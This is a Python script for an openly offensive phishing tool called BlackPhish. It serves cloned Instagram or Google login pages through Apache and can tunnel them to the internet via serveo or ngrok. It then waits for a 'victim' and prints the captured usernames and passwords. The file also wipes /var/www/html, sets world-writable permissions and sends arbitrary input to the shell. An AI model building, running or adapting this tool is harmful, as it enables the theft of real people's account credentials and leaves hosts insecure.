#!/usr/bin/python3

# You may change the code however you want

# Please create pull request to support the tool

# Please message us if you find any problems or ideas

# version 1: - release

# Please update version number each time we update


# Libraries #
try:
    from os import system, getcwd, geteuid
    from time import sleep
    from socket import create_connection
    from distutils.dir_util import copy_tree
except ImportError:
    print("\033[31;1m" + "[!] Import Error, Aborting! \033[0m")
    exit(1)

# Variables #
cwd = getcwd()

# COLORS #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"

# Check for root #
if geteuid() != 0:
    exit(red + "[!] Please run as root" + reset)

def checkInternet():
    print(yellow + "[*] Checking connection...")
    try:
        create_connection(("www.google.com", 80))
        print(green + "[+] Internet Found")
        sleep(2)
    except OSError:
        print(red + "[!] Internet Not Found" + reset)
        exit(0)
    
# Port forward to serveo #
def serveoForward():
    system('ssh -o ServerAliveInterval=60 -R inc0gnit0:80:localhost:80 serveo.net')
    
def ngrokForward():
    system('./ngrok http 80')

# Banner #
def banner():
    print('''
 \033[91;1m
                https://github.com/iinc0gnit0/BlackPhish \033[94;1m \033[5m

                             ░███░                                   ░█░   
                           ░█████                                  ░███    
                          ▒█████▓                                ░███░     
                         ████████                               ████▓      
                       ░█████████░                            ░█████       
                     ░█████████████                          ░██████       
          ░░▒███████████████████████████░░░                 ▓██████░       
 ░░░░███████████████████████████████████████████▓░▒█░     ░███████░        
█████████████████████████████████████████████████████████████████          
 ░████████████████████████████████████████████████████████████████░        
     ░░▓██████████████████████████████████████▓░░░██▓      ░░██████░       
             ░░░░▒█████████████████████░████░                  ░█████░     
                  ██████                 ░                                 
                  ░█████                                                   
                   ░████                                                   
                    ░███                                                   
                      ░█      
                                                      \033[0m\033[91m
        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
        
                
                    Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
                    
                    Script created by: \033[91;1m[ inc0gnit0 ] [ retro0001 ]\033[94;1m
                    
                    Websites created by: \033[91;1m[ TableFlipGod ]\033[94;1m 
                    
                    Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[91;1m
                    
                    
                    
        [1]\033[94;1m Instagram \033[91;1m
        
        [2]\033[94;1m Google
        
        
        \033[0m''')
    
def endMessage():
    print("\n")
    print(yellow + "  Thank you using BlackPhish\n")
    print(yellow + "  If you have any problems while using BlackPhish please report it to us\n")
    print(yellow + "  Make Pull Request to support this tool\n")
    print("\n" + reset)
    exit(0)

# Main Script #
def main():
    system("clear")
    
    checkInternet()

    system('clear') # clear #
    banner() # Load Banner #
    choice = input(red + "        [BlackPhish] -> ") # Get user input #

    # Host Instagram Page #
    if choice == "1":
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
        copy_tree("Websites/Instagram", "Server/www")
        copy_tree("Server/www", "/var/www/html")
        print(green + '[+] Coping to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(green + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()
        
    # Host Google Page #
    elif choice == '2':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
        copy_tree("Websites/Google", "Server/www")
        copy_tree("Server/www", "/var/www/html")
        print(green + '[+] Coping to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(green + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    # Clear #
    elif choice == "clear":
        system('clear')
        main()

    # Clean out everything #
    elif choice == "clean":
        print(green + '[+] Stopping Apache2 Service')
        system('service apache2 stop')
        print(green + '[+] Stopping Traffic forwarding to serveo')
        system('pkill -f inc0gnit0:80:localhost:80')
        print(green + '[+] Cleaning /var/www/html/')
        system('rm -r /var/www/html/ && mkdir /var/www/html')
        print(green + '[+] Cleaning /Server/www/')
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
        print(green + '[+] Done')
        main()
    
    # Exit #
    elif choice == 'exit':
        print(red + '[!] Exiting...')
        print(green + '[+] Have a nice day!')
    
    # Use shell #
    elif choice != "":
        system(""+choice)
        main()

    # Invalid Option Error #
    else:
        print(red + "[!] Invalid option" + reset)
        main()
        
# This will start the script #
try:
    if __name__ == '__main__':
        main()
        
# Will detect if they exit #
except KeyboardInterrupt:
    print("\n")
    print(red + "[!] KeyboardInterrupt Detected")
    print(red + "[!] Exiting" + reset)
    exit(0)
